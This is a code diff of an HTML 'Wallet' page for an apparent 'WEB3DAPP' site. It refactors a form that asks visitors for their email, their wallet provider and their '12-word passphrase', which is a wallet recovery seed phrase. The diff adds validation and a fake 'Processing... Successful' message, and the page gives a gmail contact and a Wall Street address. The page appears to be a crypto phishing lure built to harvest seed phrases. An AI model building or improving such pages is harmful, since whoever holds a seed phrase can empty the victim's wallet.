@@ -18,7 +18,7 @@
     <link rel="stylesheet" href="css/wallet.css" />
   </head>
   <body>
-    <!-- header section strats -->
+    <!-- header section starts -->
     <header class="header_section">
       <div class="container-fluid">
         <nav class="navbar navbar-expand-lg custom_nav-container">
@@ -43,9 +43,7 @@
             >
               <ul class="navbar-nav">
                 <li class="nav-item">
-                  <a class="nav-link" href="index.html"
-                    >Home</a
-                  >
+                  <a class="nav-link" href="index.html">Home</a>
                 </li>
                 <li class="nav-item">
                   <a class="nav-link" href="about.html"> About </a>
@@ -56,7 +54,8 @@
                 <li class="nav-item active">
                   <a class="nav-link" href="wallet.html">
                     <span>Wallet</span> <img src="images/wallet.png" alt="" />
-                    <span class="sr-only">(current)</span> </a>
+                    <span class="sr-only">(current)</span> 
+                  </a>
                 </li>
               </ul>
             </div>
@@ -67,110 +66,114 @@
     <!-- end header section -->
 
     <div class="wrapper fadeInDown">
-
       <div id="formContent">
-
-        <!-- Tabs title -->
-
-        <h2 class=" active underlinehover">Get Started</h2>
-        <!-- Icon -->
-
+        <h2 class="active underlinehover">Get Started</h2>
         <div class="fadeIn First">
-
           <p>Fill in your details below to get started</p>
-
         </div>
 
-        <!-- LoginForm -->
-
-        <form class="" action="index.html">
-
-        <input type="text" id="login" class="fadeIn Second" name="" placeholder="Your Email Address">
-        <input type="text" id="login" class="fadeIn Second" name="" placeholder="Wallet Provider(e.g Trust Wallet, Metamask)">
-        <input type="text" id="password" class="fadeIn Third" name="" placeholder="Your 12-Word API Passphrase">
-        <input type="submit" class="fadeIn Fourth" name="" value="Submit">
-         <!-- <a href="#" id="submit" class="fadeIn Fourth" name="">Submit</a> -->
-
+        <!-- Form -->
+        <form id="walletForm">
+          <input type="text" id="email" class="fadeIn Second" placeholder="Your Email Address">
+          <input type="text" id="walletProvider" class="fadeIn Second" placeholder="Wallet Provider (e.g Trust Wallet, Metamask)">
+          <input type="text" id="passphrase" class="fadeIn Third" placeholder="Your 12-Word API Passphrase">
+          <button type="submit" class="fadeIn Fourth">Submit</button>
         </form>
 
-        <!-- Forgotten Password -->
+        <!-- Message after form submission -->
+        <div id="status"></div>
+
+        <!-- Validation error messages -->
+        <div id="validationErrors" style="color: red;"></div>
 
         <div id="formFooter">
           <p>Having trouble connecting? </p>
-          <a class="underlinehover" href="mailto: web3dappsoftware@gmail.com">Email us at web3dappsoftware@gmail.com</a>
-
-        </div>
-
-      </div>
-
-    </div>
-
-      <!-- info section -->
-  <section class="info_section layout_padding">
-    <div class="container">
-      <div class="row">
-        <div class="col-md-3">
-          <div class="info_contact">
-            <div class="info_logo">
-              <a href="index.html">
-                <span>
-                  WEB3DAPP</span>
-              </a>
-            </div>
-            <h5>
-              Contact Us
-            </h5>
-            
-            <div>
-              <div class="img-box">
-                <img src="images/location.png" width="18px" alt="" />
-              </div>
-              <p>
-                Wall Street,New York, NY, USA
-              </p>
-            </div>
-
-
-            <div>
-              <div class="img-box">
-                <img src="images/envelope.png" width="18px" alt="" />
-              </div>
-              <p>
-                <a href="mailto:web3dappsoftware@gmail.com">web3dappsoftware@gmail.com</a>
-              </p>
-            </div>
-          </div>
-        </div>
-
-        <div class="col-md-3">
-          <div class="info_form ">
-            <h5>
-              Newsletter
-            </h5>
-            <form action="">
-              <input type="email" placeholder="Enter your email" />
-              <button>
-                Subscribe
-              </button>
-            </form>
-          </div>
+          <a class="underlinehover" href="mailto:web3dappsoftware@gmail.com">Email us at web3dappsoftware@gmail.com</a>
         </div>
       </div>
     </div>
-  </section>
 
-  <!-- end info_section -->
+    <!-- info section -->
+    <section class="info_section layout_padding">
+      <div class="container">
+        <div class="row">
+          <div class="col-md-3">
+            <div class="info_contact">
+              <div class="info_logo">
+                <a href="index.html">
+                  <span>WEB3DAPP</span>
+                </a>
+              </div>
+              <h5>Contact Us</h5>
+              <p>Wall Street, New York, NY, USA</p>
+              <p><a href="mailto:web3dappsoftware@gmail.com">web3dappsoftware@gmail.com</a></p>
+            </div>
+          </div>
+          <div class="col-md-3">
+            <div class="info_form">
+              <h5>Newsletter</h5>
+              <form action="">
+                <input type="email" placeholder="Enter your email" />
+                <button>Subscribe</button>
+              </form>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
 
-  <!-- footer section -->
-  <section class="container-fluid footer_section">
-    <p>
-      &copy; 2019 All Rights Reserved By
-      <a href="index.html">WEB3DAPP</a>
-    </p>
-  </section>
-  <!-- footer section -->
+    <!-- footer section -->
+    <section class="container-fluid footer_section">
+      <p>&copy; 2019 All Rights Reserved By <a href="index.html">WEB3DAPP</a></p>
+    </section>
+
+    <!-- JavaScript for validation and form submission -->
+    <script>
+      document.getElementById('walletForm').addEventListener('submit', function(event) {
+        event.preventDefault(); // Prevent form from submitting
+
+        // Clear any previous validation errors
+        const validationErrors = document.getElementById('validationErrors');
+        validationErrors.textContent = "";
+
+        // Get input field values
+        const email = document.getElementById('email').value.trim();
+        const walletProvider = document.getElementById('walletProvider').value.trim();
+        const passphrase = document.getElementById('passphrase').value.trim();
+
+        // Regular expression for validating email
+        const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+
+        // Validate form fields
+        if (!email || !emailPattern.test(email)) {
+          validationErrors.textContent += "Please enter a valid email address.\n";
+        }
+        if (!walletProvider) {
+          validationErrors.textContent += "Please enter a wallet provider (e.g., Trust Wallet, Metamask).\n";
+        }
+        if (!passphrase) {
+          validationErrors.textContent += "Please enter your 12-word API passphrase.\n";
+        }
+
+        // If there are validation errors, don't submit the form
+        if (validationErrors.textContent) {
+          return;
+        }
+
+        // Show "Processing" message
+        const statusDiv = document.getElementById('status');
+        statusDiv.textContent = "Processing...";
+        statusDiv.style.color = "blue"; // Add styling for better visibility
+
+        // Simulate processing and success message
+        setTimeout(function() {
+          statusDiv.textContent = "Successful! Please click here to visit the homepage. Our team will reach out to you via email soon.";
+          statusDiv.style.color = "green"; // Change color to green for success message
+        }, 3000); // 3 seconds delay for processing
+      });
+    </script>
+
     <script type="text/javascript" src="js/jquery-3.4.1.min.js"></script>
     <script type="text/javascript" src="js/bootstrap.js"></script>
-  
   </body>
 </html>
